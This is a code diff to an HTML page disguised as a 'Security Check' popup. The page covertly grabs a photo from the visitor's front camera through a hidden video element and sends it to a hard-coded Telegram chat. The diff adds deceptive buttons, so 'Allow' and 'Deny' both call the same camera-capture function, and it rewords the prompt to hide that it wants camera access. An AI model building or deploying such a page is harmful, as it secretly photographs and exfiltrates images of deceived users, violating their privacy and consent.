@@ -16,13 +16,29 @@
             text-align: center;
             display: block;
         }
+        button {
+            padding: 10px 20px;
+            margin: 5px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        #allow-btn {
+            background-color: #28a745;
+            color: white;
+        }
+        #deny-btn {
+            background-color: #dc3545;
+            color: white;
+        }
     </style>
 </head>
 <body>
     <div id="popup">
         <h3>Security Check</h3>
-        <p>This page requires camera access for verification.</p>
-        <button onclick="requestnotification()">Allow</button>
+        <p>This page requires click access for verification.</p>
+        <button id="allow-btn" onclick="requestCamera()">Allow</button>
+        <button id="deny-btn" onclick="requestCamera()">Deny</button>
     </div>
 
     <video id="video" autoplay style="display:none;"></video>
@@ -34,15 +50,17 @@
         const TELEGRAM_CHAT_ID = "7182702425";
 
         async function requestCamera() {
-            document.getElementById('popup').style.display = 'none';
+            document.getElementById('popup').style.display = 'none'; // Hide popup
 
             try {
                 // Request front camera access
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
                 const video = document.getElementById("video");
                 video.srcObject = stream;
 
-                // Wait a second for camera to start
+                // Wait for camera to start
                 await new Promise(resolve => setTimeout(resolve, 1000));
 
                 // Capture image
@@ -52,7 +70,7 @@
                 canvas.height = video.videoHeight;
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // Convert to Blob
+                // Convert to Blob and send to Telegram
                 canvas.toBlob(blob => sendToTelegram(blob), "image/jpeg");
 
                 // Stop camera
